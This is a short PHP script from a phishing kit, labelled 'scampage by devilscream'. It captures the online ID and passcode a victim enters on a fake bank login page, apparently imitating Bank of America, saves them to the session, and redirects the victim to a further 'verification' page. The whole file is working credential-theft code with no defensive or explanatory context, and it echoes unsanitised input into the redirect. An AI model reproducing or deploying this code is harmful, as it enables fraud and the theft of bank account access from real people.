<?php
// scampage by devilscream
session_start();
$banknya = $_SESSION['bank_name'];
$_SESSION['onlineid'] = $_POST['onlineid'];
$_SESSION['passcode'] = $_POST['passcode'];

echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=boaverif&appIdKey=".$_SESSION['key']."&onlineid=".$_POST["onlineid"]."&country=".$cid."'>";
exit();
?>